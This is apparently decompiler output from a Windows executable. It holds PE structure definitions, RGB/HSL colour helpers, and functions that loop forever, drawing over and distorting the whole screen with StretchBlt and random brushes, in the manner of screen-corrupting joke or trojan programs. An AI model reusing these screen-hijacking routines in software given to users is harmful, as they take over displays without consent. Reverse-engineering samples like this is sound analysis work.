typedef unsigned char   undefined;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory:31;
    dword DataIsDirectory:1;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct tagRGBQUAD tagRGBQUAD, *PtagRGBQUAD;

typedef struct tagRGBQUAD RGBQUAD;

typedef uchar BYTE;

struct tagRGBQUAD {
    BYTE rgbBlue;
    BYTE rgbGreen;
    BYTE rgbRed;
    BYTE rgbReserved;
};

typedef struct tagBITMAPINFOHEADER tagBITMAPINFOHEADER, *PtagBITMAPINFOHEADER;

typedef struct tagBITMAPINFOHEADER BITMAPINFOHEADER;

typedef ulong DWORD;

typedef long LONG;

typedef ushort WORD;

struct tagBITMAPINFOHEADER {
    DWORD biSize;
    LONG biWidth;
    LONG biHeight;
    WORD biPlanes;
    WORD biBitCount;
    DWORD biCompression;
    DWORD biSizeImage;
    LONG biXPelsPerMeter;
    LONG biYPelsPerMeter;
    DWORD biClrUsed;
    DWORD biClrImportant;
};

typedef struct tagBITMAPINFO tagBITMAPINFO, *PtagBITMAPINFO;

typedef struct tagBITMAPINFO BITMAPINFO;

struct tagBITMAPINFO {
    BITMAPINFOHEADER bmiHeader;
    RGBQUAD bmiColors[1];
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef void *PVOID;

typedef ulong ULONG_PTR;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef union _SLIST_HEADER _SLIST_HEADER, *P_SLIST_HEADER;

typedef union _SLIST_HEADER *PSLIST_HEADER;

typedef double ULONGLONG;

typedef struct _struct_299 _struct_299, *P_struct_299;

typedef struct _SINGLE_LIST_ENTRY _SINGLE_LIST_ENTRY, *P_SINGLE_LIST_ENTRY;

typedef struct _SINGLE_LIST_ENTRY SINGLE_LIST_ENTRY;

struct _SINGLE_LIST_ENTRY {
    struct _SINGLE_LIST_ENTRY *Next;
};

struct _struct_299 {
    SINGLE_LIST_ENTRY Next;
    WORD Depth;
    WORD Sequence;
};

union _SLIST_HEADER {
    ULONGLONG Alignment;
    struct _struct_299 s;
};

typedef char CHAR;

typedef CHAR *LPCSTR;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef CHAR *LPSTR;

typedef WCHAR *LPCWSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct DotNetPdbInfo DotNetPdbInfo, *PDotNetPdbInfo;

struct DotNetPdbInfo {
    char signature[4];
    GUID guid;
    dword age;
    char pdbpath[67];
};

typedef struct HFONT__ HFONT__, *PHFONT__;

typedef struct HFONT__ *HFONT;

struct HFONT__ {
    int unused;
};

typedef struct tagPOINT tagPOINT, *PtagPOINT;

struct tagPOINT {
    LONG x;
    LONG y;
};

typedef struct HBITMAP__ HBITMAP__, *PHBITMAP__;

struct HBITMAP__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HRGN__ HRGN__, *PHRGN__;

struct HRGN__ {
    int unused;
};

typedef struct tagPOINT POINT;

typedef struct HDC__ HDC__, *PHDC__;

struct HDC__ {
    int unused;
};

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

struct HBRUSH__ {
    int unused;
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

struct HWND__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME *LPFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HDC__ *HDC;

typedef struct HICON__ HICON__, *PHICON__;

struct HICON__ {
    int unused;
};

typedef struct HRGN__ *HRGN;

typedef struct tagRECT *LPRECT;

typedef struct HICON__ *HICON;

typedef void *HGDIOBJ;

typedef struct HBRUSH__ *HBRUSH;

typedef struct HBITMAP__ *HBITMAP;

typedef DWORD COLORREF;

typedef uint UINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset:31;
    dword NameIsString:1;
};

typedef struct IMAGE_LOAD_CONFIG_CODE_INTEGRITY IMAGE_LOAD_CONFIG_CODE_INTEGRITY, *PIMAGE_LOAD_CONFIG_CODE_INTEGRITY;

struct IMAGE_LOAD_CONFIG_CODE_INTEGRITY {
    word Flags;
    word Catalog;
    dword CatalogOffset;
    dword Reserved;
};

typedef struct IMAGE_DEBUG_DIRECTORY IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;

struct IMAGE_DEBUG_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword Type;
    dword SizeOfData;
    dword AddressOfRawData;
    dword PointerToRawData;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

struct IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_6 IMAGE_RESOURCE_DIR_STRING_U_6, *PIMAGE_RESOURCE_DIR_STRING_U_6;

struct IMAGE_RESOURCE_DIR_STRING_U_6 {
    word Length;
    wchar16 NameString[3];
};

typedef struct IMAGE_BASE_RELOCATION IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;

struct IMAGE_BASE_RELOCATION {
    dword VirtualAddress;
    dword SizeOfBlock;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef enum IMAGE_GUARD_FLAGS {
    IMAGE_GUARD_CF_INSTRUMENTED=256,
    IMAGE_GUARD_CFW_INSTRUMENTED=512,
    IMAGE_GUARD_CF_FUNCTION_TABLE_PRESENT=1024,
    IMAGE_GUARD_SECURITY_COOKIE_UNUSED=2048,
    IMAGE_GUARD_PROTECT_DELAYLOAD_IAT=4096,
    IMAGE_GUARD_DELAYLOAD_IAT_IN_ITS_OWN_SECTION=8192,
    IMAGE_GUARD_CF_EXPORT_SUPPRESSION_INFO_PRESENT=16384,
    IMAGE_GUARD_CF_ENABLE_EXPORT_SUPPRESSION=32768,
    IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT=65536,
    IMAGE_GUARD_RF_INSTRUMENTED=131072,
    IMAGE_GUARD_RF_ENABLE=262144,
    IMAGE_GUARD_RF_STRICT=524288,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_1=268435456,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_2=536870912,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_4=1073741824,
    IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK_8=2147483648
} IMAGE_GUARD_FLAGS;

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
    pointer32 GuardCFCCheckFunctionPointer;
    pointer32 GuardCFDispatchFunctionPointer;
    pointer32 GuardCFFunctionTable;
    dword GuardCFFunctionCount;
    enum IMAGE_GUARD_FLAGS GuardFlags;
    struct IMAGE_LOAD_CONFIG_CODE_INTEGRITY CodeIntegrity;
    pointer32 GuardAddressTakenIatEntryTable;
    dword GuardAddressTakenIatEntryCount;
    pointer32 GuardLongJumpTargetTable;
    dword GuardLongJumpTargetCount;
    pointer32 DynamicValueRelocTable;
    pointer32 CHPEMetadataPointer;
    pointer32 GuardRFFailureRoutine;
    pointer32 GuardRFFailureRoutineFunctionPointer;
    dword DynamicValueRelocTableOffset;
    word DynamicValueRelocTableSection;
    word Reserved1;
    pointer32 GuardRFVerifyStackPointerFunctionPointer;
    dword HotPatchTableOffset;
    dword Reserved2;
    dword Reserved3;
};

typedef struct HWAVEOUT__ HWAVEOUT__, *PHWAVEOUT__;

struct HWAVEOUT__ {
    int unused;
};

typedef struct tWAVEFORMATEX tWAVEFORMATEX, *PtWAVEFORMATEX;

struct tWAVEFORMATEX {
    WORD wFormatTag;
    WORD nChannels;
    DWORD nSamplesPerSec;
    DWORD nAvgBytesPerSec;
    WORD nBlockAlign;
    WORD wBitsPerSample;
    WORD cbSize;
};

typedef UINT MMRESULT;

typedef struct wavehdr_tag wavehdr_tag, *Pwavehdr_tag;

typedef struct wavehdr_tag *LPWAVEHDR;

struct wavehdr_tag {
    LPSTR lpData;
    DWORD dwBufferLength;
    DWORD dwBytesRecorded;
    DWORD_PTR dwUser;
    DWORD dwFlags;
    DWORD dwLoops;
    struct wavehdr_tag *lpNext;
    DWORD_PTR reserved;
};

typedef struct tWAVEFORMATEX WAVEFORMATEX;

typedef WAVEFORMATEX *LPCWAVEFORMATEX;

typedef struct HWAVEOUT__ *HWAVEOUT;

typedef HWAVEOUT *LPHWAVEOUT;

typedef uint uintptr_t;

typedef int errno_t;

typedef uint size_t;



undefined4 DAT_004083d4;
uint DAT_004083d8;
uint DAT_004083d0;
uint DAT_004083dc;
uint DAT_00408000;
undefined *PTR_GetDC_004060bc;
undefined *PTR_DeleteObject_00406038;
undefined *PTR_rand_0040617c;
undefined *PTR_BitBlt_00406004;
undefined4 DAT_00408000;
int DAT_004083c8;
undefined DAT_004068c0;
undefined FUN_004021a0;
undefined FUN_00402390;
undefined FUN_004024e0;
undefined FUN_00402640;
undefined FUN_00402770;
undefined FUN_00402950;
undefined FUN_00402ab0;
undefined FUN_00402cd0;
undefined FUN_00402320;
undefined FUN_004012e0;
undefined FUN_00401450;
undefined FUN_00401730;
undefined FUN_004019c0;
undefined FUN_00401b80;
undefined FUN_00401d00;
undefined FUN_00401e10;
undefined FUN_00401f40;
uintptr_t DAT_00408000;
int DAT_00408384;
void *ExceptionList;
undefined DAT_00406190;
undefined DAT_00406198;
undefined DAT_0040619c;
undefined DAT_004061a8;
undefined DAT_00408168;
undefined DAT_00408164;
undefined DAT_00408160;
undefined DAT_0040815c;
undefined DAT_00408158;
undefined DAT_00408154;
undefined DAT_00408180;
undefined DAT_00408174;
undefined DAT_00408150;
undefined DAT_0040814c;
undefined DAT_00408148;
undefined DAT_00408144;
undefined DAT_00408178;
undefined DAT_0040816c;
undefined4 DAT_00408170;
undefined DAT_0040817c;
undefined DAT_004080b8;
undefined DAT_00408074;
undefined DAT_00408068;
undefined DAT_0040806c;
undefined DAT_00408078;
undefined4 DAT_00408040;
undefined4 DAT_0040807c;
pointer PTR_DAT_004061c0;
void *DAT_00408388;
void *StackBase;
undefined1 DAT_0040838c;
char DAT_0040838d;
undefined4 DAT_00408390;
undefined DAT_00408394;
undefined DAT_00408398;
undefined DAT_0040839c;
undefined DAT_004083a0;
undefined DAT_004083a4;
int DAT_00408388;
char DAT_0040838c;
uint DAT_00408040;
undefined DAT_004083e4;
undefined DAT_004083e0;
undefined DAT_004083c0;
undefined __security_check_cookie;
uint DAT_00408058;
undefined4 DAT_004083c8;
undefined DAT_004083cc;
uint DAT_00408050;
undefined4 DAT_00408054;
undefined DAT_004083c4;
int DAT_0040805c;
uint null;

void __cdecl FUN_00401000(float *param_1,uint param_2)

{
  float fVar1;
  float fVar2;
  float fVar3;
  float fVar4;
  float fVar5;
  float fVar6;
  float fVar7;
  float fVar8;
  float fVar9;
  float fVar10;
  float fVar11;
  
  fVar5 = (float)(param_2 >> 0x10 & 0xff) / 255.0;
  fVar3 = (float)(param_2 >> 8 & 0xff) / 255.0;
  fVar7 = (float)(param_2 & 0xff) / 255.0;
  fVar2 = fVar5;
  if (fVar3 <= fVar5) {
    fVar2 = fVar3;
  }
  if (fVar7 <= fVar2) {
    fVar2 = fVar7;
  }
  fVar6 = fVar5;
  if (fVar5 <= fVar3) {
    fVar6 = fVar3;
  }
  if (fVar6 <= fVar7) {
    fVar6 = fVar7;
  }
  fVar9 = fVar6 - fVar2;
  fVar1 = fVar6 + fVar2;
  fVar8 = 0.0;
  fVar10 = fVar1 * 0.5;
  fVar4 = 0.0;
  if (fVar9 != 0.0) {
    if (0.5 <= fVar10) {
      fVar1 = (2.0 - fVar6) - fVar2;
    }
    fVar8 = fVar9 / fVar1;
    fVar2 = fVar9 * 0.5;
    fVar11 = ((fVar6 - fVar5) / 6.0 + fVar2) / fVar9;
    fVar1 = ((fVar6 - fVar3) / 6.0 + fVar2) / fVar9;
    fVar9 = ((fVar6 - fVar7) / 6.0 + fVar2) / fVar9;
    if (fVar5 == fVar6) {
      fVar4 = fVar9 - fVar1;
    }
    else if (fVar3 == fVar6) {
      fVar4 = (fVar11 + 0.33333334) - fVar9;
    }
    else {
      fVar4 = 0.0;
      if (fVar7 != fVar6) goto LAB_00401197;
      fVar4 = (fVar1 + 0.6666667) - fVar11;
    }
    if (fVar4 < 0.0) {
      fVar4 = fVar4 + 1.0;
    }
    if (1.0 < fVar4) {
      fVar4 = fVar4 - 1.0;
    }
  }
LAB_00401197:
  *param_1 = fVar4;
  param_1[1] = fVar8;
  param_1[2] = fVar10;
  return;
}



float __cdecl FUN_004011b0(float param_1,float param_2,float param_3)

{
  int iVar1;
  float fVar2;
  float fVar3;
  float fVar4;
  float fVar5;
  float fVar6;
  float fVar7;
  float fVar8;
  
  if (0.5 < param_3) {
    fVar5 = (param_3 + param_2) - param_3 * param_2;
  }
  else {
    fVar5 = (param_2 + 1.0) * param_3;
  }
  fVar2 = param_3;
  fVar4 = param_3;
  fVar6 = param_3;
  if (0.0 < fVar5) {
    iVar1 = (int)(param_1 * 6.0);
    fVar7 = (param_3 + param_3) - fVar5;
    fVar3 = ((fVar5 - fVar7) / fVar5) * fVar5 * (param_1 * 6.0 - (float)iVar1);
    fVar8 = fVar5 - fVar3;
    fVar3 = fVar3 + fVar7;
    switch(iVar1) {
    case 0:
      fVar2 = fVar3;
      fVar4 = fVar7;
      fVar6 = fVar5;
      break;
    case 1:
      fVar2 = fVar5;
      fVar4 = fVar7;
      fVar6 = fVar8;
      break;
    case 2:
      fVar2 = fVar5;
      fVar4 = fVar3;
      fVar6 = fVar7;
      break;
    case 3:
      fVar2 = fVar8;
      fVar4 = fVar5;
      fVar6 = fVar7;
      break;
    case 4:
      fVar2 = fVar7;
      fVar4 = fVar5;
      fVar6 = fVar3;
      break;
    case 5:
      fVar2 = fVar7;
      fVar4 = fVar8;
      fVar6 = fVar5;
    }
  }
  param_3 = (float)CONCAT31(CONCAT21(CONCAT11(param_3._3_1_,(char)(int)(fVar6 * 255.0)),
                                     (char)(int)(fVar2 * 255.0)),(char)(int)(fVar4 * 255.0));
  return param_3;
}



void FUN_004012e0(void)

{
  HDC hdc;
  int wDest;
  int hSrc;
  int iVar1;
  int iVar2;
  int iVar3;
  HBRUSH h;
  int iVar4;
  HDC pHVar5;
  int iVar6;
  int iVar7;
  DWORD DVar8;
  
  do {
    hdc = GetDC((HWND)0x0);
    wDest = GetSystemMetrics(0);
    hSrc = GetSystemMetrics(1);
    iVar1 = rand();
    iVar2 = rand();
    iVar3 = rand();
    h = CreateSolidBrush(iVar3 % 0xff & 0xffU |
                         (iVar2 % 0xff & 0xffU | (iVar1 % 0xff & 0xffU) << 8) << 8);
    SelectObject(hdc,h);
    iVar1 = rand();
    iVar4 = iVar1 % 0x32 + wDest;
    DVar8 = 0xac010e;
    iVar7 = 0;
    iVar6 = 0;
    iVar1 = hSrc;
    pHVar5 = hdc;
    iVar2 = hSrc;
    iVar3 = rand();
    StretchBlt(hdc,0,0,iVar3 % 0x32 + wDest,iVar1,pHVar5,iVar6,iVar7,iVar4,iVar2,DVar8);
    iVar1 = rand();
    DVar8 = 0xac010e;
    iVar3 = iVar1 % 0x32 + hSrc;
    iVar6 = 0;
    iVar4 = 0;
    pHVar5 = hdc;
    iVar1 = wDest;
    iVar2 = rand();
    StretchBlt(hdc,0,0,wDest,iVar2 % 0x32 + hSrc,pHVar5,iVar4,iVar6,iVar1,iVar3,DVar8);
    iVar1 = rand();
    iVar4 = hSrc + -0x14 + iVar1 % 0x28;
    iVar1 = rand();
    iVar3 = wDest + -0x14 + iVar1 % 0x28;
    iVar1 = rand();
    DVar8 = 0xac010e;
    iVar2 = iVar1 % 0x14 + -10;
    iVar7 = 0;
    iVar6 = 0;
    pHVar5 = hdc;
    iVar1 = rand();
    StretchBlt(hdc,iVar1 % 0x14 + -10,iVar2,iVar3,iVar4,pHVar5,iVar6,iVar7,wDest,hSrc,DVar8);
    DeleteObject(h);
    ReleaseDC((HWND)0x0,hdc);
  } while( true );
}



void FUN_00401450(void)

{
  HDC hdc;
  HBRUSH h;
  int iVar1;
  int left;
  int iVar2;
  double dVar3;
  int local_18;
  int local_c;
  
  iVar2 = 1;
  left = 10;
  local_18 = 10;
  local_c = 1;
  do {
    hdc = GetDC((HWND)0x0);
    left = left + iVar2 * 10;
    local_18 = local_18 + local_c * 10;
    switch(DAT_004083d4) {
    case 0:
      DAT_004083d8 = 0xff;
      DAT_004083d0 = 0;
      if ((int)DAT_004083dc < 0xff) {
        DAT_004083dc = DAT_004083dc + 3;
      }
      else {
        DAT_004083d4 = 1;
      }
      break;
    case 1:
      DAT_004083d0 = 0;
      DAT_004083dc = 0xff;
      if ((int)DAT_004083d8 < 1) {
        DAT_004083d4 = 2;
      }
      else {
        DAT_004083d8 = DAT_004083d8 - 3;
      }
      break;
